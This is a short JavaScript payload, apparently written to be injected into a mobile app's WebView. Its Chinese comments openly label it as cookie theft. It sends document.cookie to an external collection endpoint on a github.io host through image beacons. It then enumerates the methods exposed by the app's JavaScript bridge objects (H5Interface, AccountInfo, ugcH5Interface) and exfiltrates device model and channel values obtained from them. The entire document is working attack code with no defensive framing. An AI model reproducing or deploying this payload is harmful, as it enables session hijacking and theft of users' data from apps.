(function(){
var B = 'https://xiao-liu-android.github.io';
function beacon(k, v) {
new Image().src = B + '/collect?data=' + k + '='
+ encodeURIComponent(String(v || '').substring(0, 2000));
}
// 1) 窃取 Cookie
beacon('COOKIE', document.cookie || '(EMPTY)');
// 2) 枚举所有 JS Bridge
['H5Interface','AccountInfo','ugcH5Interface'].forEach(function(n){
try {
var o = window[n];
if (!o) { beacon('BRIDGE_' + n, 'NOT_FOUND'); return; }
var methods = [];
for (var p in o) {
try { if (typeof o[p] === 'function') methods.push(p); } catch(e) {}
}
beacon('BRIDGE_' + n, methods.join(','));
} catch(e) { beacon('BRIDGE_' + n, 'ERR:' + e.message); }
});
// 3) 调⽤ Bridge ⽅法
try { beacon('H5_model', window.H5Interface.getModel()); } catch(e) {}
try { beacon('H5_channel', window.H5Interface.getChannel()); } catch(e) {}
})()
